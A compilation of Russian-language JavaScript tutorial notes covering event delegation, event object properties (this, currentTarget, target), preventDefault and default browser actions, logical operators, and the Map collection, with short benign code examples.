Алгоритм:

1. Вешаем обработчик на контейнер.
2. В обработчике проверяем исходный элемент `event.target`.
3. Если событие произошло внутри нужного нам элемента, то обрабатываем его.

Зачем использовать:

```compare
+ Упрощает процесс инициализации и экономит память: не нужно вешать много обработчиков.
+ Меньше кода: при добавлении и удалении элементов не нужно ставить или снимать обработчики.
+ Удобство изменений DOM: можно массово добавлять или удалять элементы путём изменения `innerHTML` и ему подобных.
```

Конечно, у делегирования событий есть свои ограничения:

```compare
- Во-первых, событие должно всплывать. Некоторые события этого не делают. Также, низкоуровневые обработчики не должны вызывать `event.stopPropagation()`.
- Во-вторых, делегирование создаёт дополнительную нагрузку на браузер, ведь обработчик запускается, когда событие происходит в любом месте контейнера, не обязательно на элементах, которые нам интересны. Но обычно эта нагрузка настолько пустяковая, что её даже не стоит принимать во внимание.
```

##### объект события
https://doka.guide/js/event/

Объект `Event` описывает событие, произошедшее на странице.
Некоторые свойства объекта `event`:

`event.type`

Тип события, в данном случае `"click"`.

`event.currentTarget`

Элемент, на котором сработал обработчик. Значение – обычно такое же, как и у `this`, но если обработчик является функцией-стрелкой или при помощи `bind` привязан другой объект в качестве `this`, то мы можем получить элемент из `event.currentTarget`.

`event.clientX / event.clientY`

Координаты курсора в момент клика относительно окна, для событий мыши.

Есть также и ряд других свойств, в зависимости от типа событий, которые мы разберём в дальнейших главах.




##### Разница между `this`, `currentTarget` и `target` в обработчиках событий

В обработчиках событий JavaScript эти три понятия часто вызывают путаницу. Давайте разберём их различия на примерах.

###### Основные отличия

| Понятие | Описание | Всегда ли равно элементу, на котором висит обработчик? |
|---------|----------|--------------------------------------------------------|
| `this` | Контекст выполнения функции (в обработчиках событий обычно указывает на элемент) | Да |
| `event.currentTarget` | Элемент, на котором в данный момент выполняется обработчик события | Да |
| `event.target` | Исходный элемент, который фактически вызвал событие (где произошёл клик) | Нет |


###### `event.target`
Это исходный элемент, который инициировал событие. Он остаётся неизменным на всём пути всплытия события.

```html
<div id="outer" style="padding: 50px; background: lightblue;">
  <button id="inner">Click me</button>
</div>

<script>
document.getElementById('outer').addEventListener('click', function(event) {
  console.log('target:', event.target.id); // Будет "inner" при клике на кнопку
});
</script>
```

###### `event.currentTarget` и `this`
Эти значения всегда указывают на элемент, к которому прикреплён текущий обработчик события.

```html
<div id="outer" style="padding: 50px; background: lightblue;">
  <button id="inner">Click me</button>
</div>

<script>
document.getElementById('outer').addEventListener('click', function(event) {
  console.log('currentTarget:', event.currentTarget.id); // Всегда "outer"
  console.log('this:', this.id); // Всегда "outer" (если не привязан другой контекст)
});
</script>
```

###### Практический пример с вложенными элементами

Рассмотрим более сложный пример:

```html
<ul id="menu" style="background: #eee; padding: 20px;">
  <li>Item 1</li>
  <li>Item 2 <button>X</button></li>
  <li>Item 3</li>
</ul>

<script>
document.getElementById('menu').addEventListener('click', function(event) {
  console.log('this:', this.tagName); // UL
  console.log('currentTarget:', event.currentTarget.tagName); // UL
  console.log('target:', event.target.tagName); // Может быть LI или BUTTON
  
  // Делегирование событий - полезный паттерн
  if (event.target.tagName === 'BUTTON') {
    console.log('Кликнут button, удаляем элемент');
    event.target.closest('li').remove();
  }
});
</script>
```

###### Когда что использовать?

1. **`event.target`** - когда нужно знать, на каком именно элементе произошло событие
   - Полезно для делегирования событий
   - Например, при клике по таблице определить, по какой ячейке кликнули

2. **`event.currentTarget` или `this`** - когда нужен элемент с обработчиком
   - Например, при обработке клика по кнопке, если не важно, по какой именно её части кликнули

3. **Особенности стрелочных функций**:
   ```javascript
   element.addEventListener('click', (event) => {
     console.log(this); // Будет window (или undefined в strict mode)
     // В стрелочных функциях this не привязан к элементу!
     // Поэтому в таких случаях используйте event.currentTarget
   });
   ```

###### Итоговая таблица сравнения

| Ситуация | `this` | `event.currentTarget` | `event.target` |
|----------|--------|-----------------------|----------------|
| Клик по кнопке в div (обработчик на div) | `<div>` | `<div>` | `<button>` |
| Клик прямо по div (обработчик на div) | `<div>` | `<div>` | `<div>` |
| Стрелочная функция | Глобальный объект | `<div>` | `<button>` |
| Всплытие события | Текущий элемент в цепочке | Текущий элемент в цепочке | Исходный элемент |

Правильное понимание этих различий особенно важно при работе с делегированием событий и сложными DOM-структурами.


##### Действия браузера по умолчанию

Многие события автоматически влекут за собой действие браузера.

Например:

- Клик по ссылке инициирует переход на новый URL.
- Нажатие на кнопку "отправить" в форме – отсылку её на сервер.
- Зажатие кнопки мыши над текстом и её движение в таком состоянии – инициирует его выделение.

Если мы обрабатываем событие в JavaScript, то зачастую такое действие браузера нам не нужно. К счастью, его можно отменить.

###### Отмена действия браузера

Есть два способа отменить действие браузера:

- Основной способ – это воспользоваться объектом `event`. Для отмены действия браузера существует стандартный метод `event.preventDefault()`.
- Если же обработчик назначен через `on<событие>` (не через `addEventListener`), то также можно вернуть `false` из обработчика.

В следующем примере при клике по ссылке переход не произойдёт:

```html autorun height=60 no-beautify
<a href="/" onclick="return false">Нажми здесь</a>
или
<a href="/" onclick="event.preventDefault()">здесь</a>
```

```warn header="Возврат `false` из обработчика - это исключение"
Обычно значение, которое возвращает обработчик события, игнорируется.

Единственное исключение – это `return false` из обработчика, назначенного через `on<событие>`.

В других случаях `return` не нужен, он никак не обрабатывается.
```

### Пример: меню

Рассмотрим меню для сайта, например:

```html
<ul id="menu" class="menu">
  <li><a href="/html">HTML</a></li>
  <li><a href="/javascript">JavaScript</a></li>
  <li><a href="/css">CSS</a></li>
</ul>
```

Данный пример при помощи CSS может выглядеть так:

[iframe height=70 src="menu" link edit]

В HTML-разметке все элементы меню являются не кнопками, а ссылками, то есть тегами `<a>`. В этом подходе есть некоторые преимущества, например:

- Некоторые посетители очень любят сочетание "правый клик – открыть в новом окне". Если мы будем использовать `<button>` или `<span>`, то данное сочетание работать не будет.
- Поисковые движки переходят по ссылкам `<a href="...">` при индексации.

Поэтому в разметке мы используем `<a>`. Но нам необходимо обрабатывать клики в JavaScript, а стандартное действие браузера (переход по ссылке) - отменить.

Например, вот так:

```js
menu.onclick = function(event) {
  if (event.target.nodeName != 'A') return;

  let href = event.target.getAttribute('href');
  alert( href ); // может быть подгрузка с сервера, генерация интерфейса и т.п.

*!*
  return false; // отменить действие браузера (переход по ссылке)
*/!*
};
```

Если мы уберём `return false`, то после выполнения обработчика события браузер выполнит "действие по умолчанию" - переход по адресу из `href`. А это нам здесь не нужно, мы обрабатываем клик сами.

Кстати, использование здесь делегирования событий делает наше меню очень гибким. Мы можем добавить вложенные списки и стилизовать их с помощью CSS – обработчик не потребует изменений.

````smart header="События, вытекающие из других"
Некоторые события естественным образом вытекают друг из друга. Если мы отменим первое событие, то последующие не возникнут.

Например, событие `mousedown` для поля `<input>` приводит к фокусировке на нём и запускает событие `focus`. Если мы отменим событие `mousedown`, то фокусирования не произойдёт.

В следующем примере попробуйте нажать на первом `<input>` -- происходит событие `focus`. Но если вы нажимаете по второму элементу, то события `focus` не будет.

```html run autorun
<input value="Фокус работает" onfocus="this.value=''">
<input *!*onmousedown="return false"*/!* onfocus="this.value=''" value="Кликни меня">
```

Это потому, что отменено стандартное действие `mousedown`. Впрочем, фокусировка на элементе всё ещё возможна, если мы будем использовать другой способ. Например, нажатием клавиши `key:Tab` можно перейти от первого поля ввода ко второму. Но только не через клик мышью на элемент, это больше не работает.
````

###### Опция "passive" для обработчика

Необязательная опция `passive: true` для `addEventListener` сигнализирует браузеру, что обработчик не собирается выполнять `preventDefault()`.

Почему это может быть полезно?

Есть некоторые события, как `touchmove` на мобильных устройствах (когда пользователь перемещает палец по экрану), которое по умолчанию начинает прокрутку, но мы можем отменить это действие, используя `preventDefault()` в обработчике.

Поэтому, когда браузер обнаружит такое событие, он должен для начала запустить все обработчики и после, если `preventDefault` не вызывается нигде, он может начать прокрутку. Это может вызвать ненужные задержки в пользовательском интерфейсе.

Опция `passive: true` сообщает браузеру, что обработчик не собирается отменять прокрутку. Тогда браузер начинает её немедленно, обеспечивая максимально плавный интерфейс, параллельно обрабатывая событие.

Для некоторых браузеров (Firefox, Chrome) опция `passive` по умолчанию включена в `true` для таких событий, как `touchstart` и `touchmove`.


###### event.defaultPrevented

Свойство `event.defaultPrevented` установлено в `true`, если действие по умолчанию было предотвращено, и `false`, если нет.

Рассмотрим практическое применение этого свойства для улучшения архитектуры.

Помните, в главе <info:bubbling-and-capturing> мы говорили о `event.stopPropagation()` и упоминали, что останавливать "всплытие" - плохо?

Иногда вместо этого мы можем использовать `event.defaultPrevented`, чтобы просигналить другим обработчикам, что событие обработано.

Давайте посмотрим практический пример.

По умолчанию браузер при событии `contextmenu` (клик правой кнопкой мыши) показывает контекстное меню со стандартными опциями. Мы можем отменить событие по умолчанию и показать своё меню, как здесь:

```html autorun height=50 no-beautify run
<button>Правый клик вызывает контекстное меню браузера</button>

<button *!*oncontextmenu="alert('Рисуем наше меню'); return false"*/!*>
  Правый клик вызывает наше контекстное меню
</button>
```

Теперь в дополнение к этому контекстному меню реализуем контекстное меню для всего документа.

При правом клике должно показываться ближайшее контекстное меню.

```html autorun height=80 no-beautify run
<p>Правый клик здесь вызывает контекстное меню документа</p>
<button id="elem">Правый клик здесь вызывает контекстное меню кнопки</button>

<script>
  elem.oncontextmenu = function(event) {
    event.preventDefault();
    alert("Контекстное меню кнопки");
  };

  document.oncontextmenu = function(event) {
    event.preventDefault();
    alert("Контекстное меню документа");
  };
</script>
```

Проблема заключается в том, что когда мы кликаем по элементу `elem`, то мы получаем два меню: контекстное меню для кнопки и (событие всплывает вверх) контекстное меню для документа.

Как это поправить? Одно из решений - это подумать: "Когда мы обрабатываем правый клик в обработчике на кнопке, остановим всплытие", и вызвать `event.stopPropagation()`:

```html autorun height=80 no-beautify run
<p>Правый клик вызывает меню документа</p>
<button id="elem">Правый клик вызывает меню кнопки (добавлен event.stopPropagation)</button>

<script>
  elem.oncontextmenu = function(event) {
    event.preventDefault();
*!*
    event.stopPropagation();
*/!*
    alert("Контекстное меню кнопки");
  };

  document.oncontextmenu = function(event) {
    event.preventDefault();
    alert("Контекстное меню документа");
  };
</script>
```

Теперь контекстное меню для кнопки работает как задумано. Но цена слишком высока. Мы навсегда запретили доступ к информации о правых кликах для любого внешнего кода, включая счётчики, которые могли бы собирать статистику, и т.п. Это слегка неразумно.

Альтернативным решением было бы проверить в обработчике `document`, было ли отменено действие по умолчанию? Если да, тогда событие было обработано, и нам не нужно на него реагировать.


```html autorun height=80 no-beautify run
<p>Правый клик вызывает меню документа (добавлена проверка event.defaultPrevented)</p>
<button id="elem">Правый клик вызывает меню кнопки</button>

<script>
  elem.oncontextmenu = function(event) {
    event.preventDefault();
    alert("Контекстное меню кнопки");
  };

  document.oncontextmenu = function(event) {
*!*
    if (event.defaultPrevented) return;
*/!*

    event.preventDefault();
    alert("Контекстное меню документа");
  };
</script>
```

Сейчас всё работает правильно. Если у нас есть вложенные элементы и каждый из них имеет контекстное меню, то код также будет работать. Просто убедитесь, что проверяете `event.defaultPrevented` в каждом обработчике `contextmenu`.

```smart header="event.stopPropagation() и event.preventDefault()"
Как мы можем видеть, `event.stopPropagation()` и `event.preventDefault()` (также известный как `return false`)  - это две разные функции. Они никак не связаны друг с другом.
```

```smart header="Архитектура вложенных контекстных меню"
Есть также несколько альтернативных путей, чтобы реализовать вложенные контекстные меню. Одним из них является единый глобальный объект с обработчиком `document.oncontextmenu` и методами, позволяющими хранить в нём другие обработчики.

Объект будет перехватывать любой клик правой кнопкой мыши, просматривать сохранённые обработчики и запускать соответствующий.

Но при этом каждый фрагмент кода, которому требуется контекстное меню, должен знать об этом объекте и использовать его вместо собственного обработчика `contextmenu`.
```

###### Итого

Действий браузера по умолчанию достаточно много:

- `mousedown` -- начинает выделять текст (если двигать мышкой).
- `click` на `<input type="checkbox">` --  ставит или убирает галочку в `input`.
- `submit` -- при нажатии на `<input type="submit">` или при нажатии клавиши `key:Enter` в форме данные отправляются на сервер.
- `keydown` -- при нажатии клавиши в поле ввода появляется символ.
- `contextmenu` -- при правом клике показывается контекстное меню браузера.
- ...и многие другие...

Все эти действия можно отменить, если мы хотим обработать событие исключительно при помощи JavaScript.

Чтобы отменить действие браузера по умолчанию, используйте `event.preventDefault()` или  `return false`. Второй метод работает, только если обработчик назначен через `on<событие>`.

Опция `passive: true` для `addEventListener` сообщает браузеру, что действие по умолчанию не будет отменено. Это очень полезно для некоторых событий на мобильных устройствах, таких как `touchstart` и `touchmove`, чтобы сообщить браузеру, что он не должен ожидать выполнения всех обработчиков, а ему следует сразу приступать к выполнению действия по умолчанию, например, к прокрутке.

Если событие по умолчанию отменено, то значение `event.defaultPrevented` становится `true`, иначе `false`.

```warn header="Сохраняйте семантику, не злоупотребляйте"
Технически, отменяя действия браузера по умолчанию и добавляя JavaScript, мы можем настроить поведение любого элемента. Например, мы можем заставить ссылку `<a>` работать как кнопку, а кнопку `<button>` вести себя как ссылка (перенаправлять на другой URL).

Но нам следует сохранять семантическое значение HTML элементов. Например, не кнопки, а тег `<a>` должен применяться для переходов по ссылкам.

Помимо того, что это "хорошо", это делает ваш HTML лучше с точки зрения доступности для людей с ограниченными возможностями и с особых устройств.

Также, если мы рассматриваем пример с тегом `<a>`, то обратите внимание: браузер предоставляет возможность открывать ссылки в новом окне (кликая правой кнопкой мыши или используя другие возможности). И пользователям это нравится. Но если мы заменим ссылку кнопкой и стилизуем её как ссылку, используя CSS, то специфичные функции браузера для тега `<a>` всё равно работать не будут.
```
##### логические операторы

В JavaScript есть семь логических операторов:

- `||` (ИЛИ)
  - `||=` (Оператор логического присваивания ИЛИ)
- `&&` (И)
  - `&&=` (Оператор логического присваивания И)
- `!` (НЕ)
- `??` (Оператор нулевого слияния)
  - `??=` (Оператор нулевого присваивания)

Здесь мы рассмотрим первые пять, операторы `??` и `??=` будут в следующей статье.

Несмотря на своё название, данные операторы могут применяться к значениям любых типов. Полученные результаты также могут иметь различный тип.

Давайте рассмотрим их подробнее.

###### || (ИЛИ)

Оператор "ИЛИ" выглядит как двойной символ вертикальной черты:

```js
result = a || b;
```

Традиционно в программировании ИЛИ предназначено только для манипулирования булевыми значениями: в случае, если какой-либо из аргументов `true`, он вернёт `true`, в противоположной ситуации возвращается  `false`.

В JavaScript, как мы увидим далее, этот оператор работает несколько иным образом. Но давайте сперва посмотрим, что происходит с булевыми значениями.

Существует всего четыре возможные логические комбинации:

```js run
alert( true || true );   // true
alert( false || true );  // true
alert( true || false );  // true
alert( false || false ); // false
```

Как мы можем наблюдать, результат операций всегда равен `true`, за исключением случая, когда оба аргумента `false`.

Если значение не логического типа,  то оно к нему приводится в целях вычислений.

Например, число `1` будет воспринято как `true`, а `0` – как `false`:

```js run
if (1 || 0) { // работает как if( true || false )
  alert( 'истинно!' );
}
```

Обычно оператор `||` используется в `if` для проверки истинности любого из заданных условий.

К примеру:

```js run
let hour = 9;

*!*
if (hour < 10 || hour > 18) {
*/!*
  alert( 'Офис закрыт.' );
}
```

Можно передать и больше условий:

```js run
let hour = 12;
let isWeekend = true;

if (hour < 10 || hour > 18 || isWeekend) {
  alert( 'Офис закрыт.' ); // это выходной
}
```

###### ИЛИ "||" находит первое истинное значение [#or-finds-the-first-truthy-value]

Описанная выше логика соответствует традиционной. Теперь давайте поработаем с "дополнительными" возможностями JavaScript.

Расширенный алгоритм работает следующим образом.

При выполнении ИЛИ `||` с несколькими значениями:

```js
result = value1 || value2 || value3;
```

Оператор `||` выполняет следующие действия:

- Вычисляет операнды слева направо.
- Каждый операнд конвертирует в логическое значение. Если результат `true`, останавливается и возвращает исходное значение этого операнда.
- Если все операнды являются ложными (`false`), возвращает последний из них.

Значение возвращается в исходном виде, без преобразования.

Другими словами, цепочка ИЛИ `||` возвращает первое истинное значение или последнее, если такое значение не найдено.

Например:

```js run
alert( 1 || 0 ); // 1 (1 - истинное значение)
alert( true || 'какая-то строка' ); // true

alert( null || 1 ); // 1 (первое истинное значение)
alert( null || 0 || 1 ); // 1 (первое истинное значение)
alert( undefined || null || 0 ); // 0 (поскольку все ложно, возвращается последнее значение)
```

Это делает возможным более интересное применение оператора по сравнению с "чистым, традиционным, только булевым ИЛИ".

1. **Получение первого истинного значения из списка переменных или выражений.**

    Например, у нас есть переменные `firstName`, `lastName` и `nickName`, все они необязательные (т.е. они могут быть неопределенными или иметь ложные значения).

    Давайте воспользуемся оператором ИЛИ `||`, чтобы выбрать ту переменную, в которой есть данные, и показать её (или "Аноним", если ни в одной переменной данных нет):

    ```js run
    let firstName = "";
    let lastName = "";
    let nickName = "Суперкодер";
    
    *!*alert( firstName || lastName || nickName || "Аноним"); // Суперкодер*/!*
    ```

    Если бы все переменные были ложными, в качестве результата мы бы наблюдали `"Аноним"`.
2. **Сокращённое вычисление.**

    Ещё одной отличительной особенностью оператора ИЛИ `||` является так называемое «сокращённое вычисление».

    Это означает, что ИЛИ `||` обрабатывает свои операнды до тех пор, пока не будет достигнуто первое истинностное значение, и затем это значение сразу же возвращается, даже не затрагивая другие операнды.

    Важность этой особенности становится очевидной, если операнд -- это не просто значение, а выражение с сопутствующим эффектом, как, например, присваивание переменной или вызов функции.

    В приведенном ниже примере срабатывает только второй `alert`:

    ```js run
    *!*true*/!* || alert("никогда не сработает");
    *!*false*/!* || alert("сработает");
    ```

    В первой строке оператор ИЛИ `||` останавливает выполнение сразу после того, как сталкивается с истинным значением (`true`), поэтому сообщение не показывается.

    Иногда люди используют эту возможность для выполнения инструкций только в том случае, если условие в левой части является ложным.

###### ||= (Логическое присваивание ИЛИ)

[recent browser="new"]

Оператор логического присваивания ИЛИ `||=` записывается как обычный ИЛИ `||` с добавлением символа присваивания `=`. Такая запись не случайна, так как результат выполнения данного оператора напрямую зависит от действий уже известного нам `||`.

Вот его синтаксис:

```js
a ||= b;
```

Оператор `||=` принимает два операнда и выполняет следующие действия:

- Вычисляет операнды слева направо.
- Конвертирует `a` в логическое значение.
- Если `a` ложно, присваивает `a` значение `b`.

Концепция оператора `||=` заключается в «сокращённом вычислении», принцип работы которого мы разобрали ранее.

Теперь давайте перепишем `a ||= b` под вид «сокращённого вычисления»:

```js
a || (a = b);
```

Мы уже знаем, что ИЛИ `||` возвращает *первое истинное значение*, поэтому, если `a` является таковым, вычисление до правой части выражения не дойдёт.

Вот пример с очевидным использованием оператора `||=`:

```js run
let johnHasCar = false;

johnHasCar ||= "У Джона нет машины!"; // то же самое, что false || (johnHasCar = "...")

alert( johnHasCar ); // "У Джона нет машины!"
```

...А здесь происходит преобразование к логическому значению:

```js run
let manufacturer = ""; // оператор ||= преобразует пустую строку "" к логическому значению false

manufacturer ||= "Неизвестный производитель"; // то же самое, что false || (manufacturer = "...")

alert( manufacturer ); // "Неизвестный производитель"
```

Оператор логического присваивания ИЛИ `||=` -- это «[синтаксический сахар](https://ru.wikipedia.org/wiki/Синтаксический_сахар)», добавленный в язык в качестве более короткого варианта записи `if`-выражений с присваиванием.

Мы можем переписать приведённые выше примеры с использованием обычного `if`:

```js run
let johnHasCar = false;

if (johnHasCar == false) {
  johnHasCar = "У Джона нет машины!";
}

alert(johnHasCar); // "У Джона нет машины!"

let manufacturer = "";

if (manufacturer == false) {
  manufacturer = "Неизвестный производитель";
}

alert(manufacturer); // "Неизвестный производитель"
```

###### && (И)

Оператор И пишется как два амперсанда `&&`:

```js
result = a && b;
```

В традиционном программировании И возвращает `true`, если оба аргумента истинны, а иначе – `false`:

```js run
alert( true && true );   // true
alert( false && true );  // false
alert( true && false );  // false
alert( false && false ); // false
```

Пример с `if`:

```js run
let hour = 12;
let minute = 30;

if (hour == 12 && minute == 30) {
  alert( 'Время 12:30' );
}
```

Как и в случае с ИЛИ, любое значение допускается в качестве операнда И:

```js run
if (1 && 0) { // вычисляется как true && false
  alert( "не сработает, так как результат ложный" );
}
```


###### И "&&" находит первое ложное значение

При нескольких подряд операторах И:

```js
result = value1 && value2 && value3;
```

Оператор `&&` выполняет следующие действия:

- Вычисляет операнды слева направо.
- Каждый операнд преобразует в логическое значение. Если результат `false`, останавливается и возвращает исходное значение этого операнда.
- Если все операнды были истинными, возвращается последний.

Другими словами, И возвращает первое ложное значение. Или последнее, если ничего не найдено.

Вышеуказанные правила схожи с поведением ИЛИ. Разница в том, что И возвращает первое *ложное* значение, а ИЛИ -  первое *истинное*.

Примеры:

```js run
// Если первый операнд истинный,
// И возвращает второй:
alert( 1 && 0 ); // 0
alert( 1 && 5 ); // 5

// Если первый операнд ложный,
// И возвращает его. Второй операнд игнорируется
alert( null && 5 ); // null
alert( 0 && "какая-то строка" ); // 0
```

Можно передать несколько значений подряд. В таком случае возвратится первое "ложное" значение, на котором остановились вычисления.

```js run
alert( 1 && 2 && null && 3 ); // null
```

Когда все значения верны, возвращается последнее

```js run
alert( 1 && 2 && 3 ); // 3
```

````smart header="Приоритет оператора `&&` больше, чем у `||`"
Приоритет оператора И `&&` больше, чем ИЛИ `||`, так что он выполняется раньше.

Таким образом, код `a && b || c && d` по существу такой же, как если бы выражения `&&` были в круглых скобках: `(a && b) || (c && d)`.
````

````warn header="Не заменяйте `if` на `||` или `&&`"
Иногда люди используют оператор И `&&` как «более короткий способ записи `if`-выражения».

Например:

```js run
let x = 1;

(x > 0) && alert( 'x больше нуля!' );
```

Инструкция в правой части `&&` будет выполнена только в том случае, если вычисление дойдет до нее. То есть, только если `(x > 0)` истинно.

Таким образом, мы имеем аналог для следующего кода:

```js run
let x = 1;

if (x > 0) alert( 'x больше нуля!' );
```

Несмотря на то, что вариант с `&&` кажется более коротким, `if` более нагляден и, как правило, более читабелен. Поэтому мы рекомендуем использовать каждую конструкцию по назначению: использовать `if`, если нам нужно `if`, и использовать `&&`, если нам нужно И.
````

###### &&= (Логическое присваивание И)

[recent browser="new"]

Оператор логического присваивания И `&&=` записывается как два амперсанда `&&` и символ присваивания `=`.

Вот его синтаксис:

```js
a &&= b;
```

Принцип действия `&&=` практически такой же, как и у оператора логического присваивания ИЛИ `||=`. Единственное отличие заключается в том, что `&&=` присвоит `a` значение `b` только в том случае, если `a` *истинно*.

Концепция оператора логического присваивания И `&&=` также основывается на «сокращённом вычислении»:

```js
a && (a = b);
```

Пример использования:

```js run
let greeting = "Привет"; // строка непустая, поэтому будет преобразована к логическому значению true оператором &&=

greeting &&= greeting + ", пользователь!"; // то же самое, что true && (greeting = greeting + "...")

alert( greeting ) // "Привет, пользователь!"
```

Так как оператор логического присваивания И `&&=` также как и `||=` является «синтаксическим сахаром», мы можем без проблем переписать пример выше с использованием привычного для нас `if`:

```js run
let greeting = "Привет";

if (greeting) {
  greeting = greeting + ", пользователь!"
}

alert( greeting ) // "Привет, пользователь!"
```

На практике, в отличие от `||=`, оператор `&&=` используется достаточно редко -- обычно, в комбинации с более сложными языковыми конструкциями, о которых мы будем говорить позже. Подобрать контекст для применения данного оператора -- довольно непростая задача.

###### ! (НЕ)

Оператор НЕ представлен восклицательным знаком `!`.

Синтаксис довольно прост:

```js
result = !value;
```

Оператор принимает один аргумент и выполняет следующие действия:

1. Сначала приводит аргумент к логическому типу `true/false`.
2. Затем возвращает противоположное значение.

Например:

```js run
alert( !true ); // false
alert( !0 ); // true
```

В частности, двойное НЕ `!!` используют для преобразования значений к логическому типу:

```js run
alert( !!"непустая строка" ); // true
alert( !!null ); // false
```

То есть первое НЕ преобразует значение в логическое значение и возвращает обратное, а второе НЕ снова инвертирует его. В конце мы имеем простое преобразование значения в логическое.

Есть немного более подробный способ сделать то же самое - встроенная функция `Boolean`:

```js run
alert( Boolean("непустая строка") ); // true
alert( Boolean(null) ); // false
```

Приоритет НЕ `!` является наивысшим из всех логических операторов, поэтому он всегда выполняется первым, перед `&&` или `||`.

##### Map, Set, WeakMap, WeakSet

Сейчас мы знаем о следующих сложных структурах данных:

- Объекты для хранения именованных коллекций.
- Массивы для хранения упорядоченных коллекций.

Но этого не всегда достаточно для решения повседневных задач. Поэтому также существуют `Map` и `Set`.

###### Map

[Map](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map) -- это коллекция ключ/значение, как и `Object`. Но основное отличие в том, что `Map` позволяет использовать ключи любого типа.

Методы и свойства:

- [`new Map()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map/Map) -- создаёт коллекцию.
- [`map.set(key, value)`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map/set) -- записывает по ключу `key` значение `value`.
- [`map.get(key)`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map/get) -- возвращает значение по ключу или `undefined`, если ключ `key` отсутствует.
- [`map.has(key)`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map/has) -- возвращает `true`, если ключ `key` присутствует в коллекции, иначе `false`.
- [`map.delete(key)`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map/delete) -- удаляет элемент (пару "ключ/значение") по ключу `key`.
- [`map.clear()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map/clear) -- очищает коллекцию от всех элементов.
- [`map.size`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map/size) -- возвращает текущее количество элементов.

Например:

```js run
let map = new Map();

map.set("1", "str1");    // строка в качестве ключа
map.set(1, "num1");      // цифра как ключ
map.set(true, "bool1");  // булево значение как ключ

// помните, обычный объект Object приводит ключи к строкам?
// Map сохраняет тип ключей, так что в этом случае сохранится 2 разных значения:
alert(map.get(1)); // "num1"
alert(map.get("1")); // "str1"

alert(map.size); // 3
```

Как мы видим, в отличие от объектов, ключи не были приведены к строкам. Можно использовать любые типы данных для ключей.

```smart header="`map[key]` это не совсем правильный способ использования `Map`"
Хотя `map[key]` также работает, например, мы можем установить `map[key] = 2`, в этом случае`map` рассматривался бы как обычный JavaScript объект, таким образом это ведёт ко всем соответствующим ограничениям (только строки/символьные ключи и так далее).

Поэтому нам следует использовать методы `map`: `set`, `get` и так далее.
```

**Map может использовать объекты в качестве ключей.**

Например:

```js run
let john = { name: "John" };

// давайте сохраним количество посещений для каждого пользователя
let visitsCountMap = new Map();

// объект john - это ключ для значения в объекте Map
visitsCountMap.set(john, 123);

alert(visitsCountMap.get(john)); // 123
```

Использование объектов в качестве ключей - одна из наиболее заметных и важных функций `Map`. Это то что невозможно для `Object`. Строка в качестве ключа в `Object` - это нормально, но мы не можем использовать другой `Object` в качестве ключа в `Object`.

Давайте попробуем заменить `Map` на `Object`:

```js run
let john = { name: "John" };
let ben = { name: "Ben" };

let visitsCountObj = {}; // попробуем использовать объект

visitsCountObj[ben] = 234; // пробуем использовать объект ben в качестве ключа
visitsCountObj[john] = 123; // пробуем использовать объект john в качестве ключа, при этом объект ben будет замещён

*!*
// Вот что там было записано!
alert( visitsCountObj["[object Object]"] ); // 123 
*/!*
```

Так как `visitsCountObj` является объектом, он преобразует все ключи `Object`, такие как `john` и `ben`, в одну и ту же строку `"[object Object]"`. Это определенно не то, чего мы хотим.

```smart header="Как объект `Map` сравнивает ключи"
Чтобы сравнивать ключи, объект `Map` использует алгоритм [SameValueZero](https://tc39.github.io/ecma262/#sec-samevaluezero). Это почти такое же сравнение, что и `===`, с той лишь разницей, что `NaN` считается равным `NaN`. Так что `NaN` также может использоваться в качестве ключа.

Этот алгоритм не может быть заменён или модифицирован.

````smart header="Цепочка вызовов"
Каждый вызов `map.set` возвращает объект map, так что мы можем объединить вызовы в цепочку:

```js
map.set("1", "str1")
  .set(1, "num1")
  .set(true, "bool1");
```
````

###### Перебор Map

Для перебора коллекции `Map` есть 3 метода:

- [`map.keys()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map/keys) -- возвращает итерируемый объект по ключам,
- [`map.values()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map/values) -- возвращает итерируемый объект по значениям,
- [`map.entries()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map/entries) -- возвращает итерируемый объект по парам вида `[ключ, значение]`, этот вариант используется по умолчанию в `for..of`.

Например:

```js run
let recipeMap = new Map([
  ["огурец", 500],
  ["помидор", 350],
  ["лук",    50]
]);

// перебор по ключам (овощи)
for (let vegetable of recipeMap.keys()) {
  alert(vegetable); // огурец, помидор, лук
}

// перебор по значениям (числа)
for (let amount of recipeMap.values()) {
  alert(amount); // 500, 350, 50
}

// перебор по элементам в формате [ключ, значение]
for (let entry of recipeMap) { // то же самое, что и recipeMap.entries()
  alert(entry); // огурец,500 (и так далее)
}
```

```smart header="Используется порядок вставки"
В отличие от обычных объектов `Object`, в `Map` перебор происходит в том же  порядке, в каком происходило добавление элементов.
```

Кроме этого, `Map` имеет встроенный метод `forEach`, схожий со встроенным методом массивов `Array`:

```js
// выполняем функцию для каждой пары (ключ, значение)
recipeMap.forEach((value, key, map) => {
  alert(`${key}: ${value}`); // огурец: 500 и так далее
});
```

###### Object.entries: Map из Object

При создании `Map` мы можем указать массив (или другой итерируемый объект) с парами ключ-значение для инициализации, как здесь:

```js run
// массив пар [ключ, значение]
let map = new Map([
  ['1',  'str1'],
  [1,    'num1'],
  [true, 'bool1']
]);

alert( map.get('1') ); // str1
```

Если у нас уже есть обычный объект, и мы хотели бы создать `Map` из него, то поможет встроенный метод [Object.entries(obj)](mdn:js/Object/entries), который получает объект и возвращает массив пар ключ-значение для него, как раз в этом формате.

Так что мы можем создать `Map` из обычного объекта следующим образом:

```js run
let obj = {
  name: "John",
  age: 30
};

*!*
let map = new Map(Object.entries(obj));
*/!*

alert( map.get('name') ); // John
```

Здесь `Object.entries` возвращает массив пар ключ-значение: `[ ["name","John"], ["age", 30] ]`. Это именно то, что нужно для создания `Map`.

###### Object.fromEntries: Object из Map

